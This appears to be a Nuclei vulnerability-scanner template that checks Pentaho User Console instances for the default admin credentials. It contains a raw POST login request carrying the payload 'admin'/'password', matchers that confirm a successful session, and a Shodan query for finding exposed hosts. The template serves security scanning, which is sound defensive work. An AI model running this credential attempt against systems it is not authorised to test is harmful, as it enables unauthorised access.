id: pentaho-default-login

info:
  name: Pentaho Default Login
  author: pussycat0x
  severity: high
  description: |
    Pentaho default admin credentials were discovered.
  reference:
    - https://www.hitachivantara.com/en-us/pdfd/training/pentaho-lesson-1-user-console-overview.pdf
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
    vendor: hitachi
    product: vantara_pentaho
    shodan-query: pentaho
    runzero-match: any(each(service["html.titles"]), {# matches "^Pentaho User Console"})
  tags: pentaho,default-login

http:
  - raw:
      - |
        POST /pentaho/j_spring_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        j_username={{user}}&j_password={{pass}}

    attack: pitchfork
    payloads:
      user:
        - admin
      pass:
        - password

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'pentaho/Home'
          - 'JSESSIONID='
        condition: and

      - type: status
        status:
          - 302

